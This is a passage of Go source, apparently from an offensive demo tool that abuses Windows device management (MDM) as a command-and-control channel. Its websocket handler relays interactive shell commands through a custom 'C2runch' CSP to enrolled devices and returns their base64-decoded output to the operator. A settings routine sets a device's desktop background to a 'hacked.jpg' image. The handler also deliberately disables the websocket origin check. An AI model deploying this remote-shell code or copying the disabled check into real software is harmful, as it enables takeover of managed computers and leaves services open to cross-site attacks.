			deviceSetting.CDiskFreeSpace = getGBdataSize(setting.SettingValue)
		case mdm.CSPCDiskSystemType:
			deviceSetting.CDiskSystemType = setting.SettingValue
		case mdm.CSPTotalRAM:
			deviceSetting.TotalRAM = getGBdataSize(setting.SettingValue)
		case mdm.CSPPolicyDefenderExcludedPaths:
			//deviceSetting.AVExclusions = getToogleValueNotEmpty(setting.SettingValue)
		case mdm.CSPPolicyDefenderAV:
			deviceSetting.AVRTMonitoring = getToogleInt(setting.SettingValue)
		case mdm.CSPWDAGAllowSetting:
			deviceSetting.WDAG = getToogleValueNotEmpty(setting.SettingValue)
		case mdm.CSPWindowsUpdates:
			deviceSetting.WindowsUpdates = getToogleCustomValue(setting.SettingValue, "5")
		case mdm.CSPPersonalizationDesktopURL:
			deviceSetting.BackgroundImage = getToogleCustomValue(setting.SettingValue, "https://demomatador.io/static/images/hacked.jpg")
		case mdm.CSPPolicyWindowsVBS:
			deviceSetting.WindowsVBS = getToogleCustomValue(setting.SettingValue, "1")
		}
	}

	// Setting custom values
	deviceSetting.StaticContentURL = baseURL + "/static"

	return deviceSetting
}

// websocketHandler implements the websocket management for a given device terminal
func (app *application) websocketHandler(w http.ResponseWriter, r *http.Request) {
	var upgrader = websocket.Upgrader{
		ReadBufferSize:  1024,
		WriteBufferSize: 1024,
	}

	// Bypassing origin check - You should not do this in production
	upgrader.CheckOrigin = func(r *http.Request) bool { return true }

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		app.badRequest(w, r, err)
		return
	}

	for {
		messageType, p, err := conn.ReadMessage()
		if err != nil {
			log.Printf("Websocket error: %v\n", err)
			return
		}

		//marshall input to mdm.WebSocketCmd
		var cmd mdm.WebSocketCmd
		if err := json.Unmarshal(p, &cmd); err != nil {
			log.Printf("Websocket error: %v\n", err)
			return
		}

		//Command switch handler
		if cmd.Name == "shell" && len(cmd.Data) > 0 {

			// Deleting the CSPC2runchCSP device setting if present, we want to start fresh here
			if err := app.db.DeleteCustomDeviceSetting(cmd.DeviceID, mdm.CSPC2runchCSP); err != nil {
				log.Printf("Websocket error: %v\n", err)
				continue
			}

			if cmd.Data == "c2termstart" {
				// Tunnel session starts here

				// We are in the middle of the interactive shell session
				// Enabling the CSPC2runchCSPWait device setting to wait for tunnel input
				if err := app.cmdManager.EnableTunnelWaitFlag(cmd.DeviceID); err != nil {
					log.Printf("Websocket error: %v\n", err)
					continue
				}

			} else if cmd.Data == "c2termend" {
				// Tunnel session ends here

				if err := app.cmdManager.ClearTunnelWaitFlag(cmd.DeviceID); err != nil {
					log.Printf("Websocket error: %v\n", err)
					continue
				}

			}

			// Sending the CSPC2runchCSP command to the device
			if err := app.db.QueuePendingDeviceOperation(cmd.DeviceID, mdm.CmdReplace, mdm.CSPC2runchCSP, cmd.Data); err != nil {
				log.Printf("Websocket error: %v\n", err)
				continue
			}

			cmdReceived := false

			// Then looping for ShellSessionWaitTime secs to check if the device has responded
			for i := 0; i < mdm.ShellSessionWaitTime; i++ {
				// Checking the storage to see if the device has responded
				deviceSetting, err := app.db.GetCustomDeviceSetting(cmd.DeviceID, mdm.CSPC2runchCSP)
				if err != nil {
					log.Printf("Websocket error: %v\n", err)
					continue
				}

				// Device has not responded yet, let's wait a bit more
				if (deviceSetting == nil) || (deviceSetting.SettingValue == "") {
					time.Sleep(1 * time.Second)
					continue
				}

				// Device has responded, let's send the CSPC2runchCSP command to the device
				if deviceSetting.SettingURI == mdm.CSPC2runchCSP {

					//decode base64
					decoded, _ := base64.StdEncoding.DecodeString(deviceSetting.SettingValue)

					//delete first line that contains the command
					sanitizedDecoded := strings.Join(strings.Split(string(decoded), "\n")[1:], "\n")

					var cmdResponse = mdm.WebSocketCmd{
						Name: "shell",
						Data: sanitizedDecoded,
					}

					resBytes, err := json.Marshal(cmdResponse)
					if err != nil {
						log.Printf("Websocket error: %v\n", err)
						continue
					}

					// Device has responded, let's send the CSPC2runchCSP command to the device
					if err := conn.WriteMessage(messageType, resBytes); err != nil {
						log.Printf("Websocket error: %v\n", err)
						return
					}

					cmdReceived = true
					break
				}
			}

			// No command was received - end the ongoing shell session
			if !cmdReceived {
				var cmdResponse = mdm.WebSocketCmd{
					Name: "shell",
					Data: "endshellsession",
				}

				resBytes, err := json.Marshal(cmdResponse)
				if err != nil {
					log.Printf("Websocket error: %v\n", err)
					continue
				}

				// Device has responded, let's send the CSPC2runchCSP command to the device
				if err := conn.WriteMessage(messageType, resBytes); err != nil {
					log.Printf("Websocket error: %v\n", err)
					return
				}
			}
		}
	}
}
